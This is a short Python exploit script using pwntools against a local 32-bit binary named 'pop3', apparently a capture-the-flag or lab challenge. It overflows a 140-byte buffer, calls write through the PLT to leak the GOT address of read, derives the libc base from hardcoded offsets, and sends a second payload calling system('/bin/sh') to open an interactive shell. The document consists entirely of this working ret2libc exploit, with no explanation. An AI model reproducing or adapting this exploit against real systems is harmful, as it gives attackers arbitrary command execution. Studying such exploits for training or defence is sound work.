from pwn import *

context.arch="i386" 
context.log_level=  "debug"
p = process("./pop3")

offset = 140

read_got = 0x804a000
write_plt = 0x080483a0
vulnerable_func = 0x8048474

fd = 1
buffer = read_got
size = 4
payload = b'r'*140 + pack(write_plt) + pack(vulnerable_func) + pack(fd) + pack(buffer) + pack(size)



with open('pay', 'wb') as f:
    f.write(payload)

p.sendline(payload)

read_leak = unpack(p.recv(4))
print(f"read leak is {hex(read_leak)}")


read_offset = 0xf7d0a840 - 0xf7c00000 #p read addr - vmmap libc 1st addr
system_offset = 0xf7c4c880 - 0xf7c00000 #p system addr - vmmap libc 1st addr
bin_sh_offset  = 0xf7db5fc8 - 0xf7c00000 #find /bin/sh addr - vmmap libc 1st addr
exit_offset = 0xf7c3c180 - 0xf7c00000 # 
libc = read_leak - read_offset
system = libc + system_offset
bin_sh = libc + bin_sh_offset
exit = libc +exit_offset
print(f"""
read offset is {hex(read_offset)}
libc address is {hex(libc)}
system address is {hex(system)}
bin_sh addr is {hex(bin_sh)}
      """)


payload = b'r'*140 + pack(system) + pack(exit) + pack(bin_sh)
p.sendline(payload)


p.interactive()
